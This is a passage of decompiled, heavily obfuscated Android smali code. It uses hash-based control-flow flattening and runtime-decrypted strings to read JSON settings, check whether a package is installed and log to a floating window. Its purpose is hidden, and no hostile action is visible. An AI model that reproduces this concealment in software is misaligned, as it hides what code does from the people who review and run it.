    const-string v2, "\u06e5\u06e7\u06d8\u06d8\u06ec\u06db\u06e7\u06eb\u06e1\u06d8\u06ec\u06d8\u06da\u06e1\u06e7\u06e7\u06e6\u06e8\u06e6\u06e6\u06db\u06dc\u06d8\u06e7\u06d7\u06e7\u06dc\u06e1\u06d7\u06e8\u06e1\u06e0\u06e0\u06df\u06da\u06e1\u06db\u06da\u06db\u06d8\u06d8\u06e6\u06e8\u06e1\u06df\u06e6\u06dc\u06e7\u06e2\u06d6"

    :goto_34
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_23

    goto :goto_34

    :sswitch_7f
    const v10, -0x6857966a

    const-string v2, "\u06d6\u06dc\u06d7\u06eb\u06e4\u06e5\u06d8\u06e0\u06e1\u06d6\u06d8\u06e5\u06d9\u06ec\u06da\u06d9\u06db\u06e5\u06e8\u06e6\u06d8\u06da\u06e1\u06d9\u06e4\u06e0\u06e8\u06d8\u06e1\u06da\u06e7\u06eb\u06d6\u06d7\u06e7\u06e1\u06d8\u06d8\u06d6"

    :goto_35
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_24

    goto :goto_35

    :sswitch_80
    const-string v2, "\u06e4\u06d9\u06eb\u06da\u06eb\u06e4\u06d7\u06eb\u06d8\u06d6\u06e7\u06d8\u06d8\u06e6\u06d8\u06e8\u06df\u06d6\u06e5\u06df\u06e6\u06d8\u06e1\u06dc\u06e2\u06d8\u06da\u06df\u06e2\u06d8"

    goto :goto_34

    :sswitch_81
    const-string v2, "\u06d9\u06e8\u06d8\u06d8\u06dc\u06e8\u06ec\u06d7\u06e5\u06e7\u06df\u06dc\u06d9\u06d6\u06e6\u06d6\u06d8\u06e5\u06d6\u06e1\u06d9\u06e2\u06e7\u06e4\u06df\u06dc\u06e5\u06eb\u06d6\u06d8\u06e5\u06d7\u06e5\u06d8\u06e5\u06d9\u06db\u06df\u06da\u06d9\u06da\u06dc\u06d8\u06d8\u06dc\u06d9\u06d8\u06eb\u06e6\u06e7\u06eb\u06e2\u06e8\u06e2\u06e2\u06e8\u06e6\u06ec\u06dc"

    goto :goto_34

    :cond_10
    const-string v2, "\u06e5\u06e5\u06eb\u06e6\u06e7\u06ec\u06d6\u06e0\u06e2\u06e1\u06d6\u06e7\u06d9\u06eb\u06e0\u06e4\u06e4\u06da\u06e6\u06e2\u06e5\u06dc\u06e6\u06d9\u06e2\u06e0\u06e8\u06e6\u06dc\u06d8\u06eb\u06e5\u06d6\u06d8\u06e2\u06e2\u06e1\u06d8\u06e4\u06d9\u06db\u06e0\u06d7\u06e6\u06d8\u06d8\u06e1\u06e7\u06d8\u06d8\u06e4\u06da\u06d7\u06d7\u06e1\u06df"

    goto :goto_35

    :sswitch_82
    if-nez v4, :cond_10

    const-string v2, "\u06e5\u06d9\u06d8\u06d8\u06e8\u06e6\u06d8\u06df\u06dc\u06e8\u06d8\u06d8\u06e6\u06d6\u06d8\u06d9\u06e5\u06d8\u06e8\u06e5\u06e1\u06e5\u06eb\u06ec\u06e8\u06d7\u06dc\u06e7\u06df\u06e6\u06d8\u06e2\u06e5\u06e6\u06dc\u06e8\u06e8\u06e5\u06d8\u06d8"

    goto :goto_35

    :sswitch_83
    const-string v2, "\u06dc\u06e7\u06e0\u06e1\u06e4\u06e5\u06d8\u06e1\u06d8\u06e5\u06da\u06ec\u06e6\u06d8\u06db\u06ec\u06dc\u06d8\u06e1\u06da\u06d6\u06d8\u06d7\u06da\u06e1\u06eb\u06dc\u06d8\u06db\u06d9\u06ec\u06ec\u06e1\u06e5\u06d8\u06d9\u06e0\u06da\u06df\u06e1\u06d6\u06da\u06df\u06d6\u06d7\u06e8\u06e0\u06d8\u06eb\u06e1\u06d9\u06e7\u06d8\u06da\u06ec\u06e5\u06d8\u06eb\u06d7\u06dc\u06d8"
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_5

    goto :goto_35

    :sswitch_84
    const-string v2, "\u06e5\u06e2\u06e0\u06e8\u06e2\u06d7\u06dc\u06e0\u06e7\u06d7\u06eb\u06e4\u06e0\u06da\u06dc\u06e1\u06e1\u06e5\u06d7\u06db\u06df\u06e1\u06e5\u06e8\u06da\u06e1\u06d6\u06d8\u06e6\u06da\u06d8\u06d8\u06e4\u06df\u06dc\u06d7\u06e8\u06e4\u06da\u06d6\u06e5\u06db\u06e4\u06d8\u06d8\u06d7\u06dc\u06d6"

    goto :goto_34

    :sswitch_85
    :try_start_1c
    const-string v2, "ngrIxMPM2VKACsbK\n"

    const-string v9, "7murr6KrvA0=\n"

    invoke-static {v2, v9}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v2, "1v2lbRrvvKvL6LQ=\n"

    const-string v10, "spjRCHmb498=\n"

    invoke-static {v2, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v10, 0x0

    invoke-virtual {v4, v2, v10}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v10

    const-string v2, "uqcKcKurPCuitBs=\n"

    const-string v11, "28R+GcTFY18=\n"

    invoke-static {v2, v11}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v11, 0x0

    invoke-virtual {v4, v2, v11}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v11

    const-string v2, "A3B8X/hkURk=\n"

    const-string v12, "dxkMAIwBKW0=\n"

    invoke-static {v2, v12}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_5

    move-result-object v2

    :try_start_1d
    invoke-virtual {v4, v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_7

    move-result-object v12

    const/4 v2, 0x0

    :try_start_1e
    invoke-virtual {v7, v9, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_1e
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1e .. :try_end_1e} :catch_6
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_7

    const/4 v2, 0x1

    :goto_36
    const v13, 0x3669c3ab

    const-string v4, "\u06d8\u06e8\u06df\u06d8\u06e6\u06e1\u06e5\u06e4\u06d6\u06d8\u06e2\u06e8\u06e6\u06d7\u06dc\u06eb\u06dc\u06e7\u06e5\u06d8\u06dc\u06e0\u06e5\u06e1\u06d8\u06e6\u06e7\u06eb\u06df\u06e0\u06d7\u06e6\u06d8\u06dc\u06e8\u06ec\u06eb\u06e5\u06d8\u06e1\u06e6\u06e5\u06d8\u06ec\u06d9\u06e2\u06ec\u06d9\u06d8\u06e7\u06e6\u06eb"

    :goto_37
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_25

    goto :goto_37

    :sswitch_86
    const-string v4, "\u06d8\u06e0\u06d7\u06e2\u06e7\u06e1\u06e8\u06da\u06d6\u06d9\u06ec\u06e4\u06db\u06e4\u06eb\u06d7\u06d9\u06e8\u06d8\u06d9\u06d9\u06da\u06d8\u06e4\u06d6\u06d8\u06ec\u06e8\u06d9\u06e8\u06e7\u06dc\u06d8\u06e7\u06eb\u06db\u06e7\u06ec\u06e8\u06d6\u06da\u06e4\u06db\u06eb\u06e1\u06d8\u06e0\u06e8\u06d6\u06da\u06dc\u06d6"

    goto :goto_37

    :catch_6
    move-exception v2

    const/4 v2, 0x0

    goto :goto_36

    :sswitch_87
    const-string v4, "\u06e7\u06ec\u06e1\u06e0\u06e8\u06eb\u06e4\u06d6\u06d8\u06d8\u06d8\u06e7\u06dc\u06d8\u06e2\u06e4\u06e8\u06e6\u06e8\u06e2\u06e5\u06db\u06e8\u06d8\u06e7\u06e0\u06e8\u06d8\u06d7\u06ec\u06dc\u06d8\u06e2\u06e0\u06dc\u06ec\u06dc\u06dc\u06e6\u06e6\u06d6\u06d8"

    goto :goto_37

    :sswitch_88
    const v14, 0x6f50203a

    const-string v4, "\u06e4\u06e2\u06e2\u06e8\u06eb\u06dc\u06e6\u06e0\u06e8\u06d8\u06dc\u06eb\u06e1\u06df\u06da\u06df\u06e8\u06da\u06e1\u06dc\u06e2\u06e4\u06d7\u06e4\u06e2\u06e6\u06e6\u06d8\u06d8\u06ec\u06e8\u06d9\u06d7\u06d9\u06d9\u06d6\u06db\u06eb\u06d6\u06e5\u06d6\u06d8\u06db\u06e4\u06e2\u06e4\u06e6\u06e5\u06d8\u06dc\u06d6\u06ec\u06ec\u06e0\u06e1\u06d8\u06e2\u06dc\u06e7"

    :goto_38
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v15

    xor-int/2addr v15, v14

    sparse-switch v15, :sswitch_data_26

    goto :goto_38

    :sswitch_89
    if-nez v10, :cond_11

    const-string v4, "\u06ec\u06db\u06e1\u06d8\u06d6\u06e0\u06e2\u06d6\u06d8\u06e5\u06d8\u06e2\u06db\u06d6\u06d6\u06df\u06e5\u06ec\u06e5\u06e0\u06d9\u06d6\u06d9\u06dc\u06df\u06db\u06e0\u06da\u06d8\u06d8\u06dc\u06dc\u06dc\u06d8\u06e2\u06db\u06e1\u06d7\u06e0\u06df\u06d7\u06d6\u06db\u06d7\u06e2\u06d6\u06d8"

    goto :goto_38

    :cond_11
    const-string v4, "\u06e2\u06e5\u06dc\u06e2\u06db\u06e5\u06d8\u06e5\u06da\u06d9\u06e0\u06d6\u06dc\u06eb\u06e0\u06d8\u06d7\u06d8\u06eb\u06e6\u06d7\u06e2\u06e0\u06d8\u06da\u06eb\u06e2\u06e2\u06eb\u06e7\u06db\u06e7\u06e4\u06e2\u06d8\u06e8\u06eb\u06e4\u06da\u06e1\u06d8\u06e6\u06d8"

    goto :goto_38

    :sswitch_8a
    const-string v4, "\u06dc\u06e0\u06e8\u06d8\u06e5\u06eb\u06d9\u06d6\u06e4\u06d8\u06d8\u06e4\u06e8\u06ec\u06e4\u06e4\u06d6\u06ec\u06e5\u06d8\u06eb\u06df\u06eb\u06db\u06d7\u06d8\u06d8\u06dc\u06d9\u06df\u06dc\u06e5\u06e1"

    goto :goto_38

    :sswitch_8b
    const-string v4, "\u06d8\u06d9\u06e5\u06d8\u06e4\u06e5\u06d9\u06db\u06ec\u06eb\u06e4\u06e2\u06e5\u06d8\u06e1\u06e8\u06dc\u06d8\u06db\u06d7\u06e1\u06d7\u06e0\u06dc\u06ec\u06d6\u06d8\u06df\u06da\u06dc\u06e6\u06e6\u06e7\u06da\u06da\u06e7\u06e6\u06eb\u06e2\u06e7\u06e2\u06df\u06e7\u06d6\u06d9"

    goto :goto_37

    :sswitch_8c
    const v13, -0x945973c

    const-string v4, "\u06e6\u06d8\u06e6\u06df\u06da\u06e1\u06db\u06ec\u06e7\u06e5\u06e1\u06df\u06d8\u06e6\u06dc\u06e8\u06d8\u06db\u06e0\u06d6\u06e1\u06d7\u06df\u06e4\u06d6\u06e2\u06e6\u06d8\u06dc\u06e7\u06d8\u06e8\u06ec\u06db\u06e4\u06dc\u06e6\u06d8\u06da\u06da\u06e6\u06d8\u06e6\u06e4\u06eb\u06d6\u06da\u06e1\u06d8\u06e5\u06e5\u06e5"

    :goto_39
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_27

    goto :goto_39

    :sswitch_8d
    const v13, -0x35fdab7a    # -2135329.5f

    const-string v4, "\u06d8\u06dc\u06dc\u06d8\u06dc\u06ec\u06d8\u06e6\u06d9\u06da\u06e5\u06d6\u06d8\u06e8\u06e7\u06dc\u06e2\u06d9\u06e1\u06d8\u06e6\u06d8\u06d6\u06da\u06e6\u06e4\u06e0\u06e1\u06db\u06eb\u06eb\u06e5"

    :goto_3a
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_28

    goto :goto_3a

    :sswitch_8e
    const v14, -0x135f6198

    const-string v4, "\u06e1\u06e0\u06e8\u06e2\u06e4\u06d7\u06eb\u06e2\u06e6\u06e5\u06da\u06e6\u06e6\u06df\u06db\u06e8\u06e1\u06eb\u06e2\u06e5\u06ec\u06e0\u06eb\u06ec\u06d6\u06e5\u06da\u06e1\u06e7\u06ec\u06dc\u06e0\u06dc\u06e4\u06d7\u06da\u06dc\u06e6\u06d8\u06d9\u06da\u06e8\u06d8\u06eb\u06d6\u06d8\u06d8\u06ec\u06e6\u06ec"

    :goto_3b
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v15

    xor-int/2addr v15, v14

    sparse-switch v15, :sswitch_data_29

    goto :goto_3b

    :sswitch_8f
    const-string v4, "\u06e1\u06d8\u06d9\u06d9\u06d9\u06dc\u06e6\u06e6\u06d8\u06d6\u06e8\u06d8\u06e7\u06db\u06d8\u06d8\u06e2\u06e6\u06e2\u06e8\u06d6\u06e6\u06e1\u06e6\u06d6\u06eb\u06e8\u06e6\u06e1\u06e5\u06d6\u06d8\u06e5\u06e7\u06d6\u06dc\u06d7\u06e5\u06d8\u06d8\u06e5\u06e5\u06d8\u06ec\u06d8\u06e1\u06d8"

    goto :goto_3b

    :sswitch_90
    const-string v4, "\u06d8\u06e4\u06e1\u06d8\u06e2\u06e2\u06eb\u06d7\u06df\u06dc\u06d8\u06da\u06e5\u06eb\u06d6\u06e6\u06d8\u06d9\u06e5\u06dc\u06df\u06e7\u06e6\u06d8\u06e1\u06e6\u06e4\u06e5\u06e8\u06e8\u06e5\u06dc\u06e6\u06d9\u06d8\u06e7\u06d8\u06d6\u06e1\u06d7\u06d9\u06ec\u06e7\u06ec\u06da\u06e6\u06d9\u06e2\u06e7\u06d8\u06e1\u06d6\u06d8"

    goto :goto_39

    :sswitch_91
    const v14, -0x64c46f47

    const-string v4, "\u06db\u06e7\u06e8\u06eb\u06e6\u06d8\u06d8\u06d6\u06da\u06e6\u06e0\u06dc\u06e7\u06d8\u06db\u06d9\u06dc\u06e2\u06e5\u06e7\u06d8\u06dc\u06da\u06dc\u06d8\u06e0\u06dc\u06d6\u06d8\u06e8\u06e5\u06d9\u06d6\u06d8\u06eb"

    :goto_3c
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v15

    xor-int/2addr v15, v14

    sparse-switch v15, :sswitch_data_2a

    goto :goto_3c

    :sswitch_92
    const-string v4, "\u06df\u06e7\u06d9\u06d9\u06e1\u06e0\u06db\u06e5\u06d6\u06dc\u06e2\u06e5\u06d9\u06db\u06d6\u06d6\u06e1\u06dc\u06e0\u06e6\u06e7\u06d6\u06dc\u06e7\u06d8\u06e7\u06e7\u06e7\u06dc\u06db\u06d8\u06d7\u06e0\u06df\u06d7\u06e0\u06eb\u06e7\u06e7\u06d6\u06d8\u06e4\u06e5\u06e7\u06d8"

    goto :goto_3c

    :cond_12
    const-string v4, "\u06d6\u06d6\u06eb\u06d6\u06dc\u06d8\u06e8\u06e2\u06e5\u06e1\u06d7\u06d9\u06e8\u06d8\u06e1\u06d8\u06d8\u06da\u06e5\u06db\u06e6\u06e0\u06e4\u06eb\u06e7\u06d9\u06df\u06e0\u06d7\u06e1\u06eb\u06d7\u06dc\u06dc\u06d8\u06e8\u06df\u06dc\u06e6\u06e2\u06d7\u06e6\u06d9\u06e5\u06e5\u06e0\u06e6\u06d8\u06db\u06eb\u06df"

    goto :goto_3c

    :sswitch_93
    if-nez v2, :cond_12

    const-string v4, "\u06e7\u06d6\u06d7\u06d6\u06e8\u06e7\u06db\u06db\u06ec\u06d6\u06eb\u06e7\u06d7\u06e7\u06da\u06e1\u06dc\u06d6\u06e1\u06eb\u06e4\u06d7\u06d7\u06df\u06e5\u06e0\u06dc\u06d7\u06dc\u06d8\u06e7\u06e4\u06e1\u06e1\u06da\u06dc\u06db\u06e8\u06dc\u06e6\u06db\u06e8\u06da\u06e8\u06da\u06d8\u06ec\u06eb\u06d8\u06dc\u06dc\u06db\u06e0\u06e1"

    goto :goto_3c

    :sswitch_94
    const-string v4, "\u06e0\u06d8\u06d7\u06eb\u06da\u06d8\u06d8\u06ec\u06e5\u06e5\u06d8\u06db\u06e1\u06d9\u06db\u06e2\u06e6\u06ec\u06d8\u06d8\u06e6\u06e6\u06d8\u06d8\u06e5\u06e2\u06e8\u06df\u06e4\u06e8\u06d8\u06da\u06ec\u06e0\u06e0\u06ec\u06d6\u06d8\u06e0\u06db\u06d6\u06d8\u06e6\u06db\u06d8\u06d8"

    goto :goto_39

    :sswitch_95
    const-string v4, "\u06e0\u06e0\u06e6\u06d8\u06df\u06ec\u06d7\u06da\u06e0\u06e4\u06d8\u06e2\u06dc\u06e5\u06e6\u06da\u06e2\u06e4\u06df\u06e2\u06db\u06e2\u06db\u06d6\u06e5\u06e5\u06d8\u06e6\u06d8\u06d8\u06e0\u06d6\u06e6\u06e1\u06e5\u06ec\u06ec\u06d8\u06d8"

    goto :goto_39

    :sswitch_96
    const-string v4, "\u06da\u06e0\u06d7\u06e6\u06d6\u06e1\u06e6\u06eb\u06d6\u06d8\u06da\u06e1\u06e7\u06d8\u06d8\u06e5\u06e8\u06e4\u06dc\u06da\u06e8\u06df\u06e0\u06d7\u06e0\u06e8\u06d8\u06dc\u06e7\u06d8\u06d8\u06d8\u06ec\u06e5"

    goto :goto_3a

    :cond_13
    const-string v4, "\u06d7\u06e8\u06d9\u06dc\u06d7\u06ec\u06e4\u06d9\u06d6\u06e0\u06d7\u06db\u06ec\u06ec\u06e5\u06ec\u06e8\u06dc\u06d9\u06ec\u06ec\u06d7\u06e8\u06e6\u06d8\u06ec\u06e4\u06e8\u06e6\u06db\u06eb\u06dc\u06e1\u06e1\u06d7\u06ec\u06e6\u06d7\u06e8\u06e0\u06e0\u06da\u06e7\u06e1\u06d9\u06e0\u06ec\u06d6\u06e5\u06d8"

    goto :goto_3b

    :sswitch_97
    const/4 v4, 0x1

    if-ne v10, v4, :cond_13

    const-string v4, "\u06e2\u06e0\u06e7\u06e1\u06d7\u06e7\u06d8\u06d8\u06d8\u06ec\u06e8\u06dc\u06db\u06e6\u06e7\u06d8\u06df\u06e8\u06e8\u06eb\u06d8\u06e7\u06d8\u06d9\u06df\u06e8\u06d8\u06da\u06e8\u06e0\u06da\u06d9\u06d8\u06d8\u06e5\u06e7\u06e4\u06db\u06d6\u06d6\u06df\u06da\u06d6\u06e6\u06e8\u06e1\u06d8\u06d9\u06e4\u06e6\u06d6\u06d6"

    goto :goto_3b

    :sswitch_98
    const-string v4, "\u06e4\u06df\u06d7\u06d6\u06e5\u06d8\u06db\u06db\u06d8\u06d8\u06db\u06e5\u06dc\u06e5\u06e4\u06e5\u06d8\u06e0\u06da\u06e7\u06e0\u06e2\u06d6\u06d8\u06df\u06db\u06e2\u06d6\u06d6\u06dc\u06d6\u06d8\u06e7\u06d8\u06db\u06eb\u06e8\u06e0\u06e0\u06e1\u06d8"

    goto :goto_3a

    :sswitch_99
    const-string v4, "\u06d8\u06df\u06df\u06db\u06e2\u06eb\u06e6\u06e2\u06db\u06e4\u06d6\u06d6\u06db\u06e1\u06d8\u06d6\u06e2\u06d6\u06d8\u06d8\u06e0\u06d8\u06d8\u06d8\u06d9\u06d7\u06e1\u06e0\u06e1\u06d8\u06e4\u06e1\u06ec\u06e7\u06e4\u06dc\u06e6\u06e5\u06e6\u06da\u06d6\u06e4\u06d7\u06d7\u06e1\u06df\u06d9\u06da\u06e5\u06df\u06d8\u06d8"

    goto :goto_3a

    :sswitch_9a
    const v10, 0x711e01a6    # 7.8241E29f

    const-string v4, "\u06d6\u06e5\u06da\u06d9\u06d9\u06e5\u06e4\u06eb\u06d6\u06db\u06e1\u06d8\u06ec\u06e6\u06d8\u06d8\u06e6\u06e8\u06e1\u06d8\u06e0\u06df\u06d6\u06e8\u06ec\u06d8\u06d8\u06e0\u06dc\u06df\u06d7\u06df"

    :goto_3d
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_2b

    goto :goto_3d

    :sswitch_9b
    const v13, -0x49581342

    const-string v4, "\u06d6\u06db\u06da\u06d8\u06e8\u06e5\u06da\u06d9\u06e7\u06da\u06e5\u06db\u06df\u06ec\u06e8\u06e0\u06eb\u06d8\u06e1\u06d9\u06e6\u06d8\u06db\u06e7\u06e1\u06e4\u06e0\u06e1\u06da\u06d9\u06e6\u06d8\u06dc\u06d9\u06d9\u06e0\u06ec\u06e5\u06d8\u06db\u06db\u06d8\u06e4\u06ec\u06db"

    :goto_3e
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_2c

    goto :goto_3e

    :sswitch_9c
    if-nez v2, :cond_14

    const-string v4, "\u06e8\u06df\u06d7\u06e1\u06e2\u06e2\u06e1\u06e8\u06d8\u06d7\u06da\u06e8\u06d8\u06e4\u06da\u06d6\u06d8\u06da\u06eb\u06df\u06d8\u06e2\u06e8\u06d8\u06da\u06da\u06d8\u06d8\u06da\u06e5\u06ec\u06d8\u06e7\u06df"

    goto :goto_3e

    :sswitch_9d
    const-string v4, "\u06d7\u06ec\u06e8\u06d8\u06d7\u06e2\u06d8\u06e5\u06eb\u06d7\u06e8\u06db\u06e8\u06d9\u06d7\u06d9\u06e0\u06d8\u06d8\u06e0\u06e2\u06e4\u06e4\u06d8\u06e6\u06df\u06d6\u06e8\u06e8\u06e7\u06d6\u06d8\u06dc\u06e8\u06df\u06d6\u06d6\u06e4\u06d9\u06e7\u06db\u06dc\u06db\u06d6\u06dc\u06df\u06e5\u06d8\u06e2\u06d8\u06e1\u06e2\u06e1\u06e5\u06db\u06d6\u06d6\u06d8"

    goto :goto_3d

    :cond_14
    const-string v4, "\u06ec\u06e8\u06e4\u06d9\u06d9\u06db\u06e7\u06e4\u06e4\u06d6\u06db\u06d8\u06d6\u06e0\u06eb\u06e1\u06e2\u06eb\u06ec\u06e6\u06d8\u06ec\u06e7\u06e7\u06db\u06d6\u06d6\u06d8\u06d7\u06df\u06e4\u06e7\u06db\u06d8\u06d8\u06eb\u06e6\u06e8\u06e8\u06e5\u06ec\u06d8\u06eb\u06db\u06e4\u06d8\u06dc\u06d8\u06e7\u06d8\u06e0\u06e4\u06eb\u06e2\u06e1\u06d6\u06da"

    goto :goto_3e

    :sswitch_9e
    const-string v4, "\u06e5\u06e1\u06e8\u06d8\u06d8\u06e7\u06d9\u06d9\u06d7\u06e6\u06eb\u06dc\u06e5\u06da\u06d6\u06d6\u06d7\u06e2\u06db\u06eb\u06d8\u06e0\u06e6\u06e2\u06ec\u06e1\u06eb\u06dc\u06d8\u06db\u06db\u06da\u06dc\u06d9\u06ec\u06e6\u06d6\u06ec\u06eb\u06e2\u06d6\u06d8\u06ec\u06eb\u06e4"

    goto :goto_3e

    :sswitch_9f
    const-string v4, "\u06e8\u06e2\u06e8\u06e7\u06e0\u06db\u06db\u06e8\u06ec\u06db\u06d7\u06e8\u06e5\u06d7\u06e1\u06d8\u06d6\u06da\u06dc\u06df\u06e6\u06e4\u06d9\u06d9\u06e2\u06e6\u06d8\u06d7\u06df\u06d8\u06d8\u06d7\u06db\u06dc\u06d8\u06e7\u06da\u06e5"

    goto :goto_3d

    :sswitch_a0
    const-string v4, "\u06df\u06d6\u06e4\u06d8\u06e0\u06ec\u06d9\u06df\u06db\u06d7\u06e6\u06d8\u06d8\u06e7\u06e0\u06e4\u06df\u06eb\u06e6\u06da\u06e0\u06d7\u06df\u06d7\u06df\u06e4\u06ec\u06e1\u06ec\u06df\u06e5\u06e5\u06d7\u06d8\u06ec\u06e2\u06d8\u06d8"

    goto :goto_3d

    :sswitch_a1
    const v4, -0x708ae353

    const-string v2, "\u06d8\u06d7\u06db\u06e4\u06e4\u06d8\u06db\u06db\u06e1\u06d9\u06e1\u06db\u06ec\u06d7\u06da\u06e6\u06e6\u06e4\u06ec\u06db\u06d7\u06df\u06e4\u06e7\u06db\u06d8\u06e7\u06d8\u06e2\u06df\u06e8\u06d8\u06e2\u06eb\u06e1\u06db\u06e5\u06d9\u06df\u06eb\u06d6\u06e5\u06e8\u06d7"

    :goto_3f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v4

    sparse-switch v10, :sswitch_data_2d

    goto :goto_3f

    :sswitch_a2
    :try_start_1f
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "lvcEaF3iDer46EEXaIi8spDVCWhZ9w==\n"

    const-string v5, "dG2kh+VtLQ8=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "UI+O3XBAgcwd1oiaI3XahByA\n"

    const-string v5, "vzMCOsvIZ2E=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "H8uhghM=\n"

    const-string v5, "ernT7WEhtFU=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x0

    sput-boolean v2, Landroidx/base/저장;->a:Z
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_7

    goto/16 :goto_2b

    :catch_7
    move-exception v2

    goto/16 :goto_1f

    :sswitch_a3
    const-string v2, "\u06e1\u06e2\u06e6\u06d8\u06d8\u06dc\u06ec\u06e2\u06e4\u06e7\u06e7\u06e4\u06d8\u06d8\u06d6\u06eb\u06d9\u06df\u06d6\u06e8\u06d8\u06da\u06da\u06e1\u06e2\u06eb\u06d8\u06d8\u06d9\u06d6\u06db\u06db\u06eb\u06df\u06e1\u06e5\u06dc\u06e2\u06eb\u06e2"

    goto :goto_3f

    :sswitch_a4
    const v10, -0x243f7d8f

    const-string v2, "\u06df\u06e7\u06e5\u06db\u06e7\u06ec\u06e7\u06da\u06e0\u06e4\u06e5\u06eb\u06e8\u06e5\u06e2\u06db\u06e7\u06e8\u06e6\u06d8\u06d6\u06eb\u06eb\u06d8\u06d8\u06e0\u06e8\u06e1\u06d6\u06e1\u06d7\u06da\u06e4\u06e5\u06d8\u06e7\u06e6\u06d6\u06d8\u06d9\u06e1\u06df\u06e0\u06df\u06e5"

    :goto_40
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v10

    sparse-switch v13, :sswitch_data_2e

    goto :goto_40

    :sswitch_a5
    const-string v2, "\u06d7\u06d9\u06e1\u06dc\u06e6\u06e7\u06d7\u06da\u06eb\u06e2\u06d9\u06da\u06e8\u06e6\u06e8\u06d8\u06eb\u06d6\u06d7\u06e6\u06d9\u06eb\u06d8\u06e7\u06db\u06ec\u06e6\u06e7\u06e5\u06df\u06e6\u06e5\u06dc\u06dc\u06d8\u06d6\u06e7\u06e4"

    goto :goto_40

    :cond_15
    const-string v2, "\u06e2\u06e8\u06ec\u06e4\u06dc\u06df\u06d6\u06da\u06d8\u06e6\u06e0\u06e8\u06d9\u06e4\u06e7\u06da\u06d8\u06e7\u06d8\u06df\u06ec\u06d9\u06e7\u06e8\u06e8\u06d8\u06e7\u06eb\u06db\u06da\u06db\u06e7"

    goto :goto_40

    :sswitch_a6
    if-eqz v11, :cond_15

    const-string v2, "\u06d6\u06d9\u06e2\u06d8\u06eb\u06e5\u06d8\u06eb\u06ec\u06d6\u06d8\u06dc\u06e8\u06d8\u06d6\u06da\u06e1\u06d8\u06e6\u06dc\u06e1\u06d8\u06e1\u06d8\u06d6\u06e4\u06da\u06d7\u06e1\u06e8\u06db\u06ec\u06d6\u06d7\u06dc\u06e2\u06ec\u06da\u06ec\u06e0\u06e8\u06e1\u06e1\u06dc\u06e5"

    goto :goto_40

    :sswitch_a7
